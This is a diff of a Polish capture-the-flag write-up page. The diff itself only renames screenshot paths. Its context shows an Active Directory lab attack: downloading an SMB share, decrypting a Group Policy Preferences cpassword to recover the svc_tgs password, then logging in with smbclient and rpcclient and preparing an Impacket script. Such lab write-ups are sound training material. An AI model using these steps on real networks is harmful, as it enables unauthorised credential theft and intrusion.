@@ -290,15 +290,15 @@ SMB1 disabled -- no workgroup available
 </code></pre></div><p>Pobieram wszytskie pliki z Replication</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbget -R smb://10.10.10.100/Replication
 </code></pre></div><p>Komendą grep, został odnaleziony ciekawy fragment</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802000932.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802000932.png" alt=""  />
 </p>
 <p><code>svc_tgs:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>
 <p><code>Except at some point prior to 2012, [Microsoft published the AES private key on MSDN](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) which can be used to decrypt the password. Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.</code></p>
 <p>Pomocny okazał się artykuł <a href="https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/">https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/</a></p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802002305.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802002305.png" alt=""  />
 </p>
 <p><code>svc_tgs:GPPstillStandingStrong2k18</code></p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802002423.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802002423.png" alt=""  />
 </p>
 <p>Proba logowania na folder Users z hasłem użytkownika - Udana</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -U svc_tgs //10.10.10.100/Users
@@ -312,10 +312,10 @@ SMB1 disabled -- no workgroup available
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient -U svc_tgs 10.10.10.100
 </code></pre></div><h3 id="queryuser-dla">queryuser dla:<a hidden class="anchor" aria-hidden="true" href="#queryuser-dla">#</a></h3>
 <p><code>SVC_TGS</code></p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802011418.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802011418.png" alt=""  />
 </p>
 <p><code>Administator</code></p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210802011432.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210802011432.png" alt=""  />
 </p>
 <p>Z jakiegoś powodu była potrzeba synchronizacji czasu z maszyną, ale włączyć skrypt Impacketa</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ntpdate 10.10.10.100
